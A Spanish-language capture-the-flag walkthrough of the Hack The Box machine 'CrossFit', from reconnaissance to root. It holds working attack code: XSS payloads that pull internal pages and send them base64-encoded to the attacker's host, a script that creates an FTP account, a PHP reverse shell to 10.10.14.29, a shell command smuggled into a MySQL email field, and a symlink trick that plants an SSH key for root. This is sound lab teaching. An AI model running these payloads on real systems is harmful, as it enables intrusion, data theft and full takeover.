---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | CrossFit           |
| Os                     | Linux              |
| Difficulty             | Insane             |
| Points                 | 0                  |
| IP                     | 10.10.10.208       |

## [](#header-2)Reconocimiento

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/CrossFit/scan1.png)

### [](#header-3)NMAP   

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.10.208
```

![nmap 1](/assets/images/CrossFit/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.208 -oG allPorts
```

![nmap2](/assets/images/CrossFit/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

```s
sudo nmap -sCV -p21,22,80 10.10.10.208 -oN targeted
```

![nmap 3](/assets/images/CrossFit/nmap3.png)

Ahora, cuando hay un puerto 443 expuesto se puede hacer una prueba de conexion con openssl, en este caso como vemos que tiene tls lo intentaremos con los siguietes parametros:

```s
openssl s_client -connect 10.10.10.208:21 -starttls ftp
```

![Openssl scan](/assets/images/CrossFit/subdomain.png)

A fin de cuentas, podemos con esto inspeccionar el certificado porque en ocaciones en los certificados es posible ver nombres de correo, subdominios, dominios.

Ahora que encontramos un dominio y subdominio potenciales, lo agregaremos en nuestro /etc/hosts.

![/etc/hosts](/assets/images/CrossFit/etc_hosts.png)

Por ahora el que nos da respuesta en el navegador es gym-club.crossfit.htb, asi que analizaremos la pagina con whatweb

```s
whatweb gym-club.crossfit.htb
```

![whatweb](/assets/images/CrossFit/whatweb.png)

Podemos enumerar mas subdominios ahora con gobuster:

```s
gobuster vhost -u http://crossfit.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 200
```

Pero no nos encuentra nada, asi que seguiremos inspeccionando la pagina web.
Hay un formulario, donde se puede intentar un xss injection para interceptar tal vez credenciales de administrador. 
Lo que haremos primero es un script que pida un recurso en nuestra computadora

```s
<script src="http://10.10.14.29/test"></script>
```

Si este script lo metemos en el formulario, nos saldra que esta siendo revisado, detecto un XSS y nuestro User agent ha sido registrado.

![XSS Detected](/assets/images/CrossFit/xss_detected.png)

Por lo tanto, con burpsuite intentaremos modificar el user agent.

![Response modified](/assets/images/CrossFit/response_burp.png)

```s
sudo python3 -m http.server 80
```

![http_get](/assets/images/CrossFit/http_get.png)

Ahora que sabemos mas sobre el response de los subdominios, podemos intentar enumerar con ffuf de la siguiente manera:

```s
ffuf -u http://crossfit.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Origin: http://FUZZ.crossfit.htb" -ignore-body -mr "Access-Control-Allow-Origin"
```

![ffuf](/assets/images/CrossFit/ffuf.png)

Lo agregamos en nuestro /etc/hosts, pero vemos lo mismo que cuando pusimos la IP. De seguro cuando estemos dentro de la maquina, estos estaran visibles ahora.

Lo que podemos intentar ahora, es crearnos un archivito llamado pwned.js para que cuando sea abierto e interpretado, para que se realice una peticion a nuestro Python y nos muestre el dominio en el que se encuentra.

```js
var req1 = new XMLHttpRequest();
req1.open('GET', 'http://10.10.14.29/' + document.domain, false);
req1.send();
```

Nuestro nuevo script quedaria ahora como:

```s
<script src="http://10.10.14.29/pwned.js"></script>
```

![json responsed](/assets/images/CrossFit/js_responsed.png)

Como ha funcionado, lo siguiente seria llegar al subdominio que habiamos encontrado ahora desde este mismo metodo, modificando el js ahora como:

```js
var domain = "http://ftp.crossfit.htb"
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false);
req1.send();

var response = req1.responseText;

var req2 = new XMLHttpRequest();
req2.open('GET', 'http://10.10.14.29/' + btoa(response), false);
req2.send();
```

Ahora para visualizarlo, lo guardaremos en un index.html con:

```s
echo -n "PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KPGhlYWQ+CiAgICA8dGl0bGU+RlRQIEhvc3RpbmcgLSBBY2NvdW50IE1hbmFnZW1lbnQ8L3RpdGxlPgogICAgPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvdHdpdHRlci1ib290c3RyYXAvNC4wLjAtYWxwaGEvY3NzL2Jvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CjwvaGVhZD4KPGJvZHk+Cgo8YnI+CjxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbGctMTIgbWFyZ2luLXRiIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0icHVsbC1sZWZ0Ij4KICAgICAgICAgICAgICAgIDxoMj5GVFAgSG9zdGluZyAtIEFjY291bnQgTWFuYWdlbWVudDwvaDI+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJwdWxsLXJpZ2h0Ij4KICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJidG4gYnRuLXN1Y2Nlc3MiIGhyZWY9Imh0dHA6Ly9mdHAuY3Jvc3NmaXQuaHRiL2FjY291bnRzL2NyZWF0ZSI+IENyZWF0ZSBOZXcgQWNjb3VudDwvYT4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KCiAgICAKICAgIDx0YWJsZSBjbGFzcz0idGFibGUgdGFibGUtYm9yZGVyZWQiPgogICAgICAgIDx0cj4KICAgICAgICAgICAgPHRoPk5vPC90aD4KICAgICAgICAgICAgPHRoPlVzZXJuYW1lPC90aD4KICAgICAgICAgICAgPHRoPkNyZWF0aW9uIERhdGU8L3RoPgogICAgICAgICAgICA8dGggd2lkdGg9IjI4MHB4Ij5BY3Rpb248L3RoPgogICAgICAgIDwvdHI+CgogICAgICAgIAogICAgPC90YWJsZT4KCiAgICAKCjwvZGl2PgoKPC9ib2R5Pgo8L2h0bWw+Cg==" | base64 -d > index.html
```

Ahora, para visualizar el servicio, podemos con php hacer un:

```s
php -S 0.0.0.0:80
```

![Servicio FTP](/assets/images/CrossFit/visualizar_ftp.png)

Vamos a crear un nuevo usuario para el servicio FTP, pero debemos antes saber lo que contiene dentro, modificaremos ahora la ruta a /accounts/create y realizaremos lo anterior para visualizarlo. Modificamos en el index la ruta de http://ftp.crossfit.htb a localhost, para que siga la misma estructura y creamos un directorio llamado accounts, dentro de el guardamos la nueva pagina y podemos ahora visualizar el contenido.

![Form FTP](/assets/images/CrossFit/form_ftp.png)

Ahora para crear un usuario, podemos utilizar el siguiente script:

```js
var domain = "http://ftp.crossfit.htb/accounts/create";
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false);
req1.withCredentials = true;
req1.send();

var response = req1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response, 'text/html');
var token = doc.getElementsByName("_token")[0].value;

var req2 = new XMLHttpRequest();
var data = "username=rebick&pass=rebick4321&_token=" + token;
req2.open('POST', "http://ftp.crossfit.htb/accounts", false);
req2.withCredentials = true;
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
req2.send(data);

var response2 = req2.responseText;
var req3 = new XMLHttpRequest();
req3.open('GET', 'http://10.10.14.29/' + btoa(response2), false);
req3.send();
```

![User created](/assets/images/CrossFit/user_created.png)

Ahora que estamos registrados en el servidor de ftp, usaremos la herramienta de lftp, para ignorar el certificado que nos pide si usamos ftp.

```s
lftp 10.10.10.208
login rebick
password:
~> set ssl:verify-certificate false
```

![FTP listing Directories](/assets/images/CrossFit/ftp_listing_dir.png)

Una vez dentro, lo que podemos intentar, es cargar un archivo con el comando put, pero al hacer la prueba vimos que no teniamos permisos. Pero tal vez en uno de los directorios si. 
Crearemos una reverse shell, para ejecutarla en uno de estos dominios.

```php
<?php
    system("bash -c 'bash -i >& /dev/tcp/10.10.14.29/4444 0>&1'");
?>
```

Ahora crearemos nuetsro XSS para que ejecute el reverse shell

```js
var req1 = new XMLHttpRequest();
req1.open('GET', 'http://development-test.crossfit.htb/shell.php', false);
req1.send();
```

![Reverse shell connected](/assets/images/CrossFit/reverse_conected.png)

Para hacer una shell iteractiva:

```s
script /dev/null -c bash
```

Ctrl+Z

```s
stty raw -echo; fg
#ENTER
reset xterm

export TERM=xterm
export SHELL=bash
```

Para las filas

```s
#Consulta de tamano
stty size
45  174
#Para definir
stty rows 45 colums 174
```

Para consultar la informacion del OS:

```s
lsb_release -a
```

## [](#header-2)Escalamiento de privilegios

```s
getcap -r / 2>/dev/null
```

Veamos que archivos tiene como propietario hank

```s
find / -user hank 2>/dev/null
```

Encontramos una contrasena en la ruta /var/www/gym-club y procedemos a guardarla para crackearla con hashcat, la cual da como resultado powerpuffgirls y al intentar usarla con Hank, da resultado.

Ahora podemos ver que esta haciendo isaac en send_updates. Que en pocas palabras existia un problema en el que se podian inyectar comandos. En la ruta /etc podemos ejecutar:

```s
grep -r -i "ftpadm" 2>/dev/null
```

Y encontramos una contrasena, la cual podemos usar ahora para el servicio de ftp y lo guardaremos en el archivo credentials.

Nos logeamos a traves de este servicio y accedemos a mysql 

```s
mysql -ucrossfit -p
pass oeLoo~y2baeni

use crossfit;
show tables;
insert into users(email) values("; bash -c 'bash -i >& /dev/tcp/10.10.14.29/443 0>&1';");
```

Creamos otro archivo para insertarlo en el ftp server como administradores en /messages y tenemos ahora la shell como isaac

![Isaac accessed](/assets/images/CrossFit/isaac_accessed.png)

Ahora, vemos que podemos escribir en el directorio /var/local, asi que para monitorizar el archivo de prueba que creamos. 

```s
#Para monitorear consecutivamente el archivo usamos:
watch -n1 ls -l
```

Y vemos que al cabo de 1 minuto, se borra el archivo de prueba.

Nos vamos al directorio /dev/shm y creamos un archivo:

```s
touch procmon.sh
chmod +x procmon.sh
#podemos ver todos los comandos ejecutados con un
ps -eo command
```

Vamos a hacer un script de bash en nuestro procmon.sh para que nos muestre el comando que esta borrando nuestro archivo anterior.

```bash
#!/bin/bash

function ctrl_c(){
        echo -e "\n\n[!] Saliendo...\n"
        exit 1
}

#Ctrl+c
trap ctrl_c INT

old_process=$(ps -eo command)

tput civis; while true; do  
        new_process=$(ps -eo command)
        diff <(echo "$old_process") <(echo "$new_process") | grep -vE "procmon|kworker|command"
        old_process=$new_process
done; tput cnorm
```

```s
wget http://10.10.14.29/procmon.sh
```

```s
chmod +x procmon.sh
```

![Listing process](/assets/images/CrossFit/proces_list.png)

No pudimos ver mas sobre los procesos ejecutados, pero podemos usar pspy para enumerar mas procesos. Encontramos un programa que podemos ver como funciona llamado dmsg, lo abriremos con ghidra dark.
Notamos varias cosas, opera con la base de datos, con el tiempo y abre el archivo en /var/backups donde tenemos acceso a escritura. Podemos tomar control si escribimos un archivo con el mismo nombre que tendria el archivo en cierto tiempo de la siguiente manera:

Creamos un archivo llamado getTime.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main(void){

    time_t curr_time = time(NULL);
    int seed = curr_time - (curr_time % 60) + 61;

    srand(seed);

    printf("%d", rand()); 

    return 0;
}
```

Nos descargamos el programa en /dev/shm:

```s
wget http://10.10.14.29/getTime.c
```

Para ejecutar nuestro programa usamos un:

```s
gcc getTime.c -o getTime
```

Despues nos vamos a /var/local para ejecutar lo siguiente:

```s
echo -n "$(/dev/shm/getTime)5656" | md5sum; echo
HASH
ln -s -f /root/.ssh/authorized_keys HASH
```

Insertaremos en la base de datos las llaves publicas de nuestro usuario de la siguiente forma:

```SQL
insert into messages(id, name, email, message) values('5656', 'ssh-rsa', 'root@rebickPC', 'AAAAB3NzaC1yc2EAAAADAQABAAABgQDUe4HO+qT9e140eZyxtUc42VSHPsN7mhOzKTdgdXNk1OEBabvJbRI0s9K5j1R9ZUiFR/v+pZqBQyG40zsPz+8nl0EFaqTC52P9kU3a/5ki+90316WESx5bfNdZ20oWLbp0W4etq03ahc2HI8/Dr+vH9eW7uEa0Z6mXtds1c6WlUije7iK9XuuatdE+kqO0D3Rgepqaqf8zx2P3fjxHcLGozs68tFFsGLa6CpkleYFn/Zip4MA/wFkElwH1eIrJ1EKL6FRSKGINAHOU01aeoYXsh6TZ5INurVJd/ZpUd7S4CSzpx6ZlYKT3v5H+bnAdncZ0TGAEbxbo/F5pBi0u31R6NJwfDfEatbvKSidBjnEUwIDUObdQ45K9uDXnlivhC+8NL4M7dysvAwTqMKSmk79bD101e+SMKTdBss74w2T4zvcsIxZRVrH8gn5bBpUcThQDWr1ex+XL35cHoHfuoQ/2stpmzuuo0/NWPxMlelH47/Qufo/AZHajDadoGNhLR7c=');
```

![Root powned](/assets/images/CrossFit/root_pwned.png)

![Machine Done](/assets/images/CrossFit/powned.png)